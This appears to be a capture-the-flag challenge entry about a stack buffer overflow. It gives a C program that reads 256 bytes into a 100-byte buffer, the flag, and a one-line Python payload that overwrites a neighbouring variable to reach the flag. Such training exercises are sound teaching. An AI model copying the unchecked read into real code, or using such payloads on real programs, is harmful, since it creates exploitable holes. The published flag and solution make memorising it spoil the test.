Title: It's overflowing!

Points: hard

Description: I know the code of the main program, but not the flag function. Help me retrieve the flag pls :) 

Here is the part of the code i know:

    int main() {
        int secret = 0xdeadbeef;
        char name[100] = {0};
        read(0, name, 256); // TODO: check security here
        if (secret == 0x1337) {
            puts("Wow! Here's a secret.\n");
            print_flag();
        } else {
            puts("I guess you're not cool enough to see my secret");
        }
        return 0; 
    }


Flag: VOSSCTF{pls_dont_overflow_my_buffers}

Author: Lukas Justin Borge

Solution: └─$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*108 + b"\x37\x13\x00\x00")' |./overflow